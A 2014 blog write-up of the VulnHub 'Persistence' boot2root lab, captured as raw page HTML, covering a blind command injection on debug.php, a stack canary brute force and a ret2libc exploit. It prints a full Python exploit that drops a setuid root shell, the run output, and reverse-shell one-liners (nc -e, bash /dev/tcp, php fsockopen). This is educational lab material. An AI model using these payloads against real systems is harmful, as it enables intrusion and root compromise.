canary value of '90'! [+] Canary seems to be 00ef8d90 Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A’s and send it. No stack smashing message appeared and we got the bye message :)\nwopr - NX and EIP If you can recall from earlier, wopr was compiled with the NX bit set. Effectively that means we can’t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.\nThe idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the system() command, for almost obvious reasons.\nI decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:\nbash-4.1$ ldd /usr/local/bin/wopr linux-gate.so.1 = (0xb7fff000) libc.so.6 = /lib/libc.so.6 (0xb7e62000) /lib/ld-linux.so.2 (0x00110000) bash-4.1$ ldd /usr/local/bin/wopr linux-gate.so.1 = (0xb7fff000) libc.so.6 = /lib/libc.so.6 (0xb7e62000) /lib/ld-linux.so.2 (0x00110000) The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)\nThe next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple export SHELL=/bin/bash fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.\nbash-4.1$ export SHELL=/bin/bash bash-4.1$ gdb -q /usr/bin/telnet Reading symbols from /usr/bin/telnet...(no debugging symbols found)...done. Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686 (gdb) b *main # set a breakpoint to stop the flow once we hit the main() func Breakpoint 1 at 0x7b90 (gdb) r # run the program Starting program: /usr/bin/telnet Breakpoint 1, 0x00117b90 in main () (gdb) p system # We hit our breakpoint, lets leak the address for system() $1 = {} 0xb7e56210  (gdb) We find system() at 0xb7e56210. I used the telnet binary simply because it is also linked to libc.\nSo to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:\n- - - - [42 Bytes in Total] - - -  [ A x 30 ] [ \\xff\\xff\\xff\\xff ] [ AAAA ] [ \\x10\\x62\\xe5\\xb7 ] ^~ Initial BF ^~ Bruted cookie ^~ system() - - - - [42 Bytes in Total] - - -  The address for system() is ‘backwards’ because we are working with a little endian system. The 4 * A before the address to system() is simply padding to EIP.\nwopr - code exec This part, by far, took me the longest of the entire challenge!\nThe next step was to get actual code to execute using system(). While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was “to remember, you are trying to make a program do what it is not intended to do, expect difficulty!”.\nI tried to put a command in a env variable and failed. I attempted to write a ROP chain and failed.\nThese failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script /tmp/runme to run. runme was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had gcc installed :)\n“fail” * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.\nEventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.\nReturning later with a fresh look, I run wopr through strings one more time:\nroot@kali:~/Desktop/persistence# strings wopr /lib/ld-linux.so.2 __gmon_start__ libc.so.6 _IO_stdin_used [.. snip ..] [^_] [+] yeah, I don't think so socket setsockopt bind [+] bind complete listen /tmp/log #  TMPLOG [+] waiting for connections [+] logging queries to $TMPLOG accept [+] got a connection [+] hello, my name is sploitable [+] would you like to play a game? [+] bye! See that? Can you see that… We have /tmp/log RIGHT THERE!\nI confirmed that /tmp/log wasn’t actually in use, and moved my original /tmp/runme script there.\nThe only thing that was left now was to find the location of the string /tmp/log in wopr, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:\nroot@kali:~# gdb -q ./wopr Reading symbols from wopr...(no debugging symbols found)...done. gdb-peda$ b *main Breakpoint 1 at 0x80487de gdb-peda$ r [----------------------------------registers-----------------------------------] EAX: 0xbffff4a4 -- 0xbffff60a (\"wopr\") EBX: 0xb7fbfff4 -- 0x14bd7c ECX: 0x66a6f92e EDX: 0x1 ESI: 0x0 EDI: 0x0 EBP: 0xbffff478 -- 0x0 ESP: 0xbffff3fc -- 0xb7e8ae36 (: mov DWORD PTR [esp],eax) EIP: 0x80487de (: push ebp) EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x80487d7 : call 0x804865c  0x80487dc : leave 0x80487dd : ret = 0x80487de : push ebp 0x80487df : mov ebp,esp 0x80487e1 : sub esp,0x258 0x80487e7 : mov eax,DWORD PTR [ebp+0x8] 0x80487ea : mov DWORD PTR [ebp-0x23c],eax [------------------------------------stack-------------------------------------] 0000| 0xbffff3fc -- 0xb7e8ae36 (: mov DWORD PTR [esp],eax) 0004| 0xbffff400 -- 0x1 0008| 0xbffff404 -- 0xbffff4a4 -- 0xbffff60a (\"wopr\") 0012| 0xbffff408 -- 0xbffff4ac -- 0xbffff629 (\"SSH_AGENT_PID=3171\") 0016| 0xbffff40c -- 0xb7fe08d8 -- 0xb7e74000 -- 0x464c457f 0020| 0xbffff410 -- 0xb7ff6821 (mov eax,DWORD PTR [ebp-0x10]) 0024| 0xbffff414 -- 0xffffffff 0028| 0xbffff418 -- 0xb7ffeff4 -- 0x1cf2c [------------------------------------------------------------------------------] Legend: code, data, rodata, value Breakpoint 1, 0x080487de in main () gdb-peda$ searchmem /tmp/log Searching for '/tmp/log' in: None ranges Found 2 results, display max 2 items: wopr : 0x8048c60 (\"/tmp/log\") wopr : 0x8049c60 (\"/tmp/log\") /tmp/log can be found in 2 places. Lets choose 0x8048c60! Now we finally have everything we need to build the payload to send.\nwopr - the exploit To sum up what we have to do to exploit this, we can say that we have to:\n Provide a string of size 30 Provide the canary we have brute forced Pad with 4 bytes Write EIP to the location of system() Provide 4 bytes of JUNK (or the location of exit() as a return) Provide the location of /tmp/log  In my exploit, as a result of the above, I would therefore send a payload similar to this:\n\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\" + \"\\xff\\xff\\xff\\xff\" + \"AAAA\" + \"\\x10\\xc2\\x16\\x00\" + \"JUNK\" + \"\\x60\\x8c\\x04\\x08\" I finished up coding the exploit, which eventually resulted in the following:\nimport socket import sys import os payload = \"A\" * 30 # amount of bytes to before the canary is hit canary = \"\" # canary that should update as its bruted print \"\"\" A: \"So, I heard you like pain...?\" B: \"... a bit\" C: \"Well, here it is, the: \" ____ ___ ____ _____ ____ _____ ______ ___ ____ __ ___ | \\ / _]| \\ / ___/| / ___/| | / _]| \\ / ] / _] | o ) [_ | D )( \\_ | ( \\_ | | / [_ | _ | / / / [_ | _/ _]| / \\__ | | |\\__ ||_| |_|| _]| | |/ / | _] | | | [_ | \\ / \\ | | |/ \\ | | | | [_ | | / \\_ | [_ | | | || . \\ \\ | | |\\ | | | | || | \\ || | |__| |_____||__|\\_| \\___||____|\\___| |__| |_____||__|__|\\____||_____| _____ ____ _ ___ ____ ______ / ___/| \\| | / \\| || | ( \\_ | o ) | | || | | | \\__ || _/| |___ | O || | |_| |_| / \\ || | | || || | | | \\ || | | || || | | | \\___||__| |_____| \\___/|____| |__| A: \"AKA: FU superkojiman \u0026\u0026 sagi- !!\" A: \"I also have no idea what I am doing\" \"\"\" print \"[+] Connecting \u0026 starting canary brute force...\" # start the canary brute loop. We want to brute 4 bytes ... for x in xrange(1,5): # ... and try all possibilities for canary_byte in xrange(0, 256): # prepare the byte hex_byte = chr(canary_byte) # prepare the payload send = payload + canary + hex_byte # connect and send payload sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('127.0.0.1', 3333)) # get the inital banners sock.recv(35) # [+] hello, my name is sploitable\\n sock.recv(40) # [+] would you like to play a game?\\n sock.recv(5) #  # send the payload sock.send(send) sock.recv(27) # [+] yeah, I don't think so\\n # if we have a OK response, then we will have this last part # as '[+] bye!\\n' populated, if its wrong, not data = sock.recv(64) # [+] bye!\\n if \"bye\" in data: print \"[+] Found a possible canary value of '{0}'!\".format(hex_byte.encode(\"hex\")) canary += hex_byte sock.close() break sock.close() # if we cant even find the first byte, we failed already if len(canary)  0: print \"[-] Unable to even find the first bit of the canary. No luck\" sys.exit(0) # The canary is our ticket out of here! if len(canary) == 4: print \"[+] Canary known as : {0}\".format(canary.encode(\"hex\")) print \"[+] Writing /tmp/log to be called by wopr later\" # ./wopr has the string /tmp/log in it. We will use this as # our code exec point, overwriting whatever is in it atm stager = \"\"\" #!/bin/sh # First, prepare a small C shell and move it to /tmp with name getroot echo \"int main(void)\\n{\\nsetuid(0);\\nsystem(\\\\\"/bin/sh\\\\\");\\nreturn 0;\\n}\"  /tmp/getroot.c # compile it /usr/bin/gcc /tmp/getroot.c -o /tmp/getroot # change ownership and setuid /bin/chown root:root /tmp/getroot /bin/chmod 4777 /tmp/getroot \"\"\" # write the file with open('/tmp/log','w') as stager_file: stager_file.write(stager) # make it executable os.chmod('/tmp/log', 0755) # now, with the stack canary known and the stager ready, lets corrupt # EIP and sploit! payload += canary # canary we bruted payload += \"A\" * 4 # padding to EIP wich is at byte 42 payload += \"\\x10\\x62\\xe5\\xb7\" # system() @ 0xb7e56210, NULL is ok cause memcpy(). Recheck location of system in gdb incase the sploit fails. payload += \"JUNK\" # JUNK. Should probably do exit() here. Meh. payload += \"\\x60\\x8c\\x04\\x08\" # location if /tmp/log string in .data # and connect \u0026\u0026 send print \"[+] Connecting to service\" sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.connect(('127.0.0.1', 3333)) sock.recv(35) sock.recv(40) sock.recv(5) print \"[+] Sending Payload\" sock.send(payload) sock.recv(64) sock.close() print \"[+] Done\" print \"[+] going to try and spawn /tmp/getroot, assuming the sploit worked :)\" os.system(\"/tmp/getroot\") else: print \"[!] Incomplete Canary. Can't continue reliably\" # done A sample run would be:\nbash-4.1$ ls -lah /tmp/sploit.py -rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py bash-4.1$ python /tmp/sploit.py A: \"So, I heard you like pain...?\" B: \"... a bit\" C: \"Well, here it is, the: \" ____ ___ ____ _____ ____ _____ ______ ___ ____ __ ___ | \\ / _]| \\  / ___/| / ___/| | / _]| \\  / ] / _] | o ) [_ | D )( \\_ | ( \\_ | | / [_ | _ | / / / [_ | _/ _]| / \\__ | | |\\__ ||_| |_|| _]| | |/ / | _] | | | [_ | \\  / \\ | | |/ \\ | | | | [_ | | / \\_ | [_ | | | || . \\ \\  | | |\\  | | | | || | \\  || | |__| |_____||__|\\_| \\___||____|\\___| |__| |_____||__|__|\\____||_____| _____ ____ _ ___ ____ ______ / ___/| \\| | / \\| || | ( \\_ | o ) | | || | | | \\__ || _/| |___ | O || | |_| |_| / \\ || | | || || | | | \\  || | | || || | | | \\___||__| |_____| \\___/|____| |__| A: \"AKA: FU superkojiman \u0026\u0026 sagi- !!\" A: \"I also have no idea what I am doing\" [+] Connecting \u0026 starting canary bruteforce... [+] Found a possible canary value of '64'! [+] Found a possible canary value of 'd3'! [+] Found a possible canary value of 'c6'! [+] Found a possible canary value of '15'! [+] Canary known as : 64d3c615 [+] Writing /tmp/log to be called by wopr later [+] Connecting to service [+] Sending Payload [+] Done [+] going to try and spawn /tmp/getroot, assuming the sploit worked :) sh-4.1# id uid=0(root) gid=500(avida) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 And, as proof, we cat the flag!\nsh-4.1# cat /root/flag.txt .d8888b. .d8888b. 888 d88P Y88bd88P Y88b888 888 888888 888888 888 888 888888 888888 888888888 888 888 888888 888888 888888 888 888 888888 888888 888888 Y88b 888 d88PY88b d88PY88b d88PY88b. \"Y8888888P\" \"Y8888P\" \"Y8888P\" \"Y888 Congratulations!!! You have the flag! We had a great time coming up with the challenges for this boot2root, and we hope that you enjoyed overcoming them. Special thanks goes out to @VulnHub for hosting Persistence for us, and to @recrudesce for testing and providing valuable feedback! Until next time, sagi- \u0026 superkojiman conclusion Persistence kicked ass!! I learned a ton and that is the ultimate win. Thanks sagi- \u0026\u0026 superkojiman for an incredible challenge! Thanks Vulnhub for the hosting and community!\nthats not all There are however a few more things I’d like to try.\n Find if and how we can root Persistence using sysadmin-tool Modify the exploit to a working ROP payload Explore other avenues to break out of rbash ","wordCount":"7004","inLanguage":"en","datePublished":"2014-09-18T06:58:53Z","dateModified":"2014-09-18T06:58:53Z","author":{"@type":"Person","name":"Leon Jacobs"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://leonjza.github.io/blog/2014/09/18/from-persistence/"},"publisher":{"@type":"Organization","name":"#!/bin/note\n","logo":{"@type":"ImageObject","url":"https://leonjza.github.io/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://leonjza.github.io accesskey=h title="#!/bin/note
 (Alt + H)">#!/bin/note
</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://leonjza.github.io/about/ title="About Me">
<span>About Me</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/archives title=Archive>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/categories title=Categories>
<span>Categories</span>
</a>
</li>
<li>
<a href=https://leonjza.github.io/search/ title="Search (Alt + /)" accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://leonjza.github.io>Home</a>&nbsp;»&nbsp;<a href=https://leonjza.github.io/posts/>Posts</a></div>
<h1 class=post-title>
From Persistence
</h1>
<div class=post-meta>September 18, 2014&nbsp;·&nbsp;33 min&nbsp;·&nbsp;Leon Jacobs&nbsp;|&nbsp;<a href=https://github.com/leonjza/leonjza.github.io/tree/source/content/posts/2014-09-18-from-persistence.markdown rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#persist-we-must aria-label="persist we must!">persist we must!</a></li>
<li>
<a href=#lets-get-our-hands-dirty aria-label="lets get our hands dirty">lets get our hands dirty</a></li>
<li>
<a href=#finding-that-debugger aria-label="finding that (de)bugger">finding that (de)bugger</a></li>
<li>
<a href=#blind-command-injection aria-label="blind command injection">blind command injection</a></li>
<li>
<a href=#blind-command-injection---file-enumeration aria-label="blind command injection - file enumeration">blind command injection - file enumeration</a></li>
<li>
<a href=#blind-command-injection---port-scanner aria-label="blind command injection - port scanner">blind command injection - port scanner</a></li>
<li>
<a href=#data-exfiltration aria-label="data exfiltration">data exfiltration</a></li>
<li>
<a href=#sysadmin-tool aria-label=sysadmin-tool>sysadmin-tool</a></li>
<li>
<a href=#shell-and-breakout-as-avida aria-label="shell and breakout as avida">shell and breakout as avida</a></li>
<li>
<a href=#the-wopr-game aria-label="the wopr game">the wopr game</a></li>
<li>
<a href=#wopr-stack-smashing aria-label="wopr, stack smashing">wopr, stack smashing</a></li>
<li>
<a href=#wopr---stack-canary-bruteforce aria-label="wopr - stack canary bruteforce">wopr - stack canary bruteforce</a></li>
<li>
<a href=#wopr---nx-and-eip aria-label="wopr - NX and EIP">wopr - NX and EIP</a></li>
<li>
<a href=#wopr---code-exec aria-label="wopr - code exec">wopr - code exec</a></li>
<li>
<a href=#wopr---the-exploit aria-label="wopr - the exploit">wopr - the exploit</a></li>
<li>
<a href=#conclusion aria-label=conclusion>conclusion</a></li>
<li>
<a href=#thats-not-all aria-label="thats not all">thats not all</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=persist-we-must>persist we must!<a hidden class=anchor aria-hidden=true href=#persist-we-must>#</a></h2>
<p>Persistence! A new boot2root hosted <a href=https://twitter.com/vulnhub>@VulnHub</a>, authored by <a href=https://twitter.com/superkojiman>@superkojiman</a> and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a <a href=http://blog.vulnhub.com/2014/09/competition-persistence.html>writeup competition</a> launched on September the 7th, and ran up until October th 5th.</p>
<p>This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go &ldquo;meh, next&rdquo;. As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!</p>
<h2 id=lets-get-our-hands-dirty>lets get our hands dirty<a hidden class=anchor aria-hidden=true href=#lets-get-our-hands-dirty>#</a></h2>
<p>As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.</p>
<p>My VM got the IP 192.168.56.104, and the first Nmap result was:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 <span style=color:#f92672>(</span> http://nmap.org <span style=color:#f92672>)</span> at 2014-09-18 07:01 SAST
Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.104
Host is up, received reset <span style=color:#f92672>(</span>0.0037s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>65534</span> filtered ports
Reason: <span style=color:#ae81ff>65534</span> no-responses
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 4131.90 seconds
</code></pre></div><p>Not exactly much to work with, but its something at least! We know now that according to the web server banners, we are facing nginx. A welcome change to the usual apache stuff we see! A quick and nasty Google for nginx 1.4.7 exploits also did not return with any really interesting results. Not a problem really.</p>
<p>Browsing to the site did not reveal anything interesting. A creepy image of melting clocks (what&mldr;) with the page sources serving it being minimal and uninteresting too. Manually poking about the web paths (for things like robots.txt etc) also did not reveal anything. The first hint however came when I fiddled with the index page location.</p>
<p>By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried <code>index.html</code>, and got the normal landing. When I requested <code>index.php</code> though, things changed drastically:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# curl -v 192.168.56.104/index.php
* About to connect<span style=color:#f92672>()</span> to 192.168.56.104 port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
*   Trying 192.168.56.104...
* connected
* Connected to 192.168.56.104 <span style=color:#f92672>(</span>192.168.56.104<span style=color:#f92672>)</span> port <span style=color:#ae81ff>80</span> <span style=color:#f92672>(</span><span style=color:#75715e>#0)</span>
&gt; GET /index.php HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: 192.168.56.104
&gt; Accept: */*

* additional stuff not fine transfer.c:1037: <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>
* HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 <span style=color:#ae81ff>404</span> Not Found
&lt; Server: nginx/1.4.7
&lt; Date: Thu, <span style=color:#ae81ff>18</span> Sep <span style=color:#ae81ff>2014</span> 07:28:18 GMT
&lt; Content-Type: text/html
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; X-Powered-By: PHP/5.3.3

No input file specified.

* Connection <span style=color:#75715e>#0 to host 192.168.56.104 left intact</span>
* Closing connection <span style=color:#75715e>#0</span>
</code></pre></div><p>As can be seen in the output above, the header <code>X-Powered-By: PHP/5.3.3</code> is now present, and the output <code>No input file specified.</code>. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.</p>
<h2 id=finding-that-debugger>finding that (de)bugger<a hidden class=anchor aria-hidden=true href=#finding-that-debugger>#</a></h2>
<p>With this information now gathered, it was time to pull out one of my favorite tools, <code>wfuzz</code>! With <code>wfuzz</code>, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.</p>
<p>My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending <em>.php</em> to my <code>FUZZ</code> keyword:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc <span style=color:#ae81ff>404</span> http://192.168.56.104/FUZZ.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://192.168.56.104/FUZZ.php
Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt

Total requests: 1660
<span style=color:#f92672>==================================================================</span>
ID  Response   Lines      Word         Chars          Request
<span style=color:#f92672>==================================================================</span>

00434:  C<span style=color:#f92672>=</span><span style=color:#ae81ff>200</span>     <span style=color:#ae81ff>12</span> L        <span style=color:#ae81ff>28</span> W      <span style=color:#ae81ff>357</span> Ch    <span style=color:#e6db74>&#34; - debug&#34;</span>
</code></pre></div><p>Yay. <code>wfuzz</code> is stupidly fast and finished the above in like 4 seconds. Browsing to http://192.168.56.101/debug.php showed us a input field labeled &ldquo;Ping address:&rdquo; and a submit button</p>
<figure>
<img loading=lazy src=/images/persistence_debug_php.png>
</figure>
<p>&ldquo;Command injection?&rdquo;, was the first thought here.</p>
<h2 id=blind-command-injection>blind command injection<a hidden class=anchor aria-hidden=true href=#blind-command-injection>#</a></h2>
<p>I started by entering a valid IP address that had <code>tcpdump</code> listening to test if the script is actually running a ping like it says &mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv <span style=color:#66d9ef>for</span> full protocol decode
listening on eth0, link-type EN10MB <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>, capture size <span style=color:#ae81ff>65535</span> bytes
07:46:15.503023 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 1, length <span style=color:#ae81ff>64</span>
07:46:15.503040 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 1, length <span style=color:#ae81ff>64</span>
07:46:16.503729 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 2, length <span style=color:#ae81ff>64</span>
07:46:16.503768 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 2, length <span style=color:#ae81ff>64</span>
07:46:17.503180 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 3, length <span style=color:#ae81ff>64</span>
07:46:17.503260 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 3, length <span style=color:#ae81ff>64</span>
07:46:18.502811 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 64004, seq 4, length <span style=color:#ae81ff>64</span>
07:46:18.502842 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 64004, seq 4, length <span style=color:#ae81ff>64</span>
</code></pre></div><p>&mldr; which it was. What is important to note here is that we have 4 echo requests.</p>
<p>I then proceeded to modify the input attempting to execute other commands too. None of my attempts returned any output to the browser, however, sending the field <code>;exit 0;</code> caused the HTTP request to complete almost instantly while no ping requests were observed on the <code>tcpdump</code>. This had me certain that this field was vulnerable to a command injection vulnerability.</p>
<p>This is all good, but not getting any output makes it really had to work with this. So, the next steps were to try and get a reverse/bind shell out of this command injection vulnerability.</p>
<p>I tried the usual culprits: <code>nc &lt;ip> &lt;port> -e /bin/bash</code>; <code>bash -i >& /dev/tcp/&lt;ip>/&lt;port> 0>&1</code>; <code>php -r '$sock=fsockopen("&lt;ip>",&lt;port>);exec("/bin/sh -i &lt;&3 >&3 2>&3");'</code>. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?</p>
<h2 id=blind-command-injection---file-enumeration>blind command injection - file enumeration<a hidden class=anchor aria-hidden=true href=#blind-command-injection---file-enumeration>#</a></h2>
<p>Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.</p>
<p>I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash <code>if [ -f /file ]</code> statement, with a single ping for success, and 2 pings for a failure. The string for the <code>debug.php</code> input field looked something like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>;<span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -f /bin/sh <span style=color:#f92672>]</span> ; <span style=color:#66d9ef>then</span> ping 192.168.56.102 -c <span style=color:#ae81ff>1</span> ; <span style=color:#66d9ef>else</span> ping 192.168.56.102 -c <span style=color:#ae81ff>2</span> ; <span style=color:#66d9ef>fi</span>
</code></pre></div><p>Submitting the above input presented me with a single ping, confirming that <code>/bin/sh</code> exists.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# tcpdump icmp
tcpdump: verbose output suppressed, use -v or -vv <span style=color:#66d9ef>for</span> full protocol decode
listening on eth0, link-type EN10MB <span style=color:#f92672>(</span>Ethernet<span style=color:#f92672>)</span>, capture size <span style=color:#ae81ff>65535</span> bytes
08:15:53.557994 IP 192.168.56.104 &gt; 192.168.56.102: ICMP echo request, id 63493, seq 1, length <span style=color:#ae81ff>64</span>
08:15:53.558011 IP 192.168.56.102 &gt; 192.168.56.104: ICMP echo reply, id 63493, seq 1, length <span style=color:#ae81ff>64</span>

</code></pre></div><p>Checking for something like <code>/bin/sh2</code> responded with 2 pings, as expected. Awesome. I can now enumerate the existence of files. The concept itself is probably pretty useless, however, if I can confirm the existence of something useful, such as <code>/bin/nc</code>, I may end up with greater success of a shell!</p>
<p>I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless, <code>/usr/bin/python</code> appeared to be available! I really like python so this had me really happy.</p>
<h2 id=blind-command-injection---port-scanner>blind command injection - port scanner<a hidden class=anchor aria-hidden=true href=#blind-command-injection---port-scanner>#</a></h2>
<p>I tested a few commands with <code>python -c</code>, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.</p>
<p>No. Luck.</p>
<p>I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &lsquo;prober&rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my <code>tcpdump</code> for any tcp traffic comming from this host:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> socket
<span style=color:#66d9ef>for</span> port <span style=color:#f92672>in</span> xrange(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>65535</span>):
    sock <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM)
    sock<span style=color:#f92672>.</span>settimeout(<span style=color:#ae81ff>0.1</span>)
    sock<span style=color:#f92672>.</span>connect_ex((<span style=color:#e6db74>&#34;192.168.56.102&#34;</span>, port))
    sock<span style=color:#f92672>.</span>close()
</code></pre></div><p>Using my blind command injection, I echoed this content to <code>/tmp/probe.py</code> via the input field, and then in a subsequent request, ran it using <code>python /tmp/probe.py</code>. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&mldr;</p>
<h2 id=data-exfiltration>data exfiltration<a hidden class=anchor aria-hidden=true href=#data-exfiltration>#</a></h2>
<p>With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the <code>debug.php</code> file on disk and tried to echo a PHP web shell to the same directory. This also failed.</p>
